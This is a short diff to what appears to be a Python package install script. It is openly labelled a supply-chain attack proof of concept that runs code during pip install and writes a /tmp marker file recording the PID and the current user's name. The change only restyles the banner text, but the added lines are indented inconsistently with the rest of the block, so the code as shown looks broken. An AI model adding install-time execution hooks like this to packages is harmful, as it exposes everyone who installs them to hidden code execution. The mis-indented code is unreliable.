@@ -6,7 +6,9 @@ import sys
 poc_file = f"/tmp/SUPPLY_CHAIN_POC_{os.getpid()}.txt"
 with open(poc_file, "w") as f:
     f.write("="*60 + "\n")
-    f.write("SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
+        f.write("╔══════════════════════════════════════════════════════╗\n")
+        f.write("║        SUPPLY CHAIN ATTACK POC BY TALHAKHAN          ║\n")
+        f.write("╚══════════════════════════════════════════════════════╝\n")
     f.write("="*60 + "\n")
     f.write(f"PROOF: Code executed during pip install\n")
     f.write(f"User: {os.getenv('USER')}\n")
